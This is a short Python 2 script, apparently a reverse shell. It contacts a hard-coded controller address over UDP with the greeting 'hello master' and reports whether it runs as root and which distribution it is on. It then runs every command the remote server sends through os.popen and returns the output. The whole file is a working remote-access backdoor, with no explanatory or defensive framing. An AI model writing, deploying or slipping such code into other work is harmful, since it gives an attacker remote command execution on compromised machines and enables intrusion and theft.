#! /usr/bin/python

import socket
import os
import sys
import platform
# don't forget to update the address and port!
server_address = ('192.168.56.103', 10000)

def launch():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #s.bind(('', 80))
    #launch = s.recv(1024)
    #addr = launch[1][0]
    #port = launch[1][1]
    s.sendto('hello master', server_address)
    return s

s = launch()
prompt = []

def getsysinfo():
    #que = s.recvfrom(1024)
    #if que[1][0] == addr and que[1][1] == port:
    if os.getuid() == 0:
        prompt.append('root@')
        prompt.append('# ')
    else:
        prompt.append('user@')  
        prompt.append('$ ')
    prompt.insert(1, platform.dist()[0])
    #s.sendto(''.join(prompt), server_address)
    return


getsysinfo()
def shell():
    while 1:
        try:
            sent = s.sendto(''.join(prompt), server_address)
            command,count = s.recvfrom(1024)
            print 'got command: ', command
            if command.strip() == '':
                continue
            if command.strip().split()[0] == 'cd':
                os.chdir(command.strip('cd '))
                s.sendto('Changed Directory', server_address)
            elif command.strip() == 'goodbye' or command.strip() == 'exit':
                s.sendto('Goodbye master', server_address)
                s.close()
                break
            else:
                proc = os.popen(command)
                output = proc.read()
                output = output.strip()
                s.sendto(output, server_address)
            command = ''
        except Exception, e:
            s.sendto('An unexpected error has occured', server_address)
shell()
